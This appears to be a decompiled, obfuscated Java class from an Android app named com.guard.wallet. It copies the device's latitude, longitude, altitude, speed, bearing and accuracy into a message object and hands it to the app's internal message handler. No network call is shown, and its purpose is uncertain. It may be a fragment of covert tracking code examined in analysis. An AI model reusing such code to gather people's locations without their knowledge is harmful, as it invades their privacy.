package v;

import android.location.Location;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.DeviceLocationVO;

public final class a {
   public static volatile a b;
   public Integer a = 1;

   public static void a(Location var0) {
      if (var0 != null) {
         DeviceLocationVO var1 = new DeviceLocationVO();
         if (var0.hasAccuracy()) {
            var1.setAccuracy(var0.getAccuracy());
         }

         if (var0.hasAltitude()) {
            var1.setAltitude(var0.getAltitude());
         }

         if (var0.hasSpeed()) {
            var1.setSpeed(var0.getSpeed());
         }

         if (var0.hasBearing()) {
            var1.setBearing(var0.getBearing());
         }

         var1.setLongitude(var0.getLongitude());
         var1.setLatitude(var0.getLatitude());
         MessageRecordVO var2 = new MessageRecordVO();
         var2.setExtraBody(var1);
         var2.setIntentCode("android.intent.action.DEVICE_LOCATION");
         MainApplication.getInstance().getHandlerMsgAndTimer().b(var2);
      }
   }
}
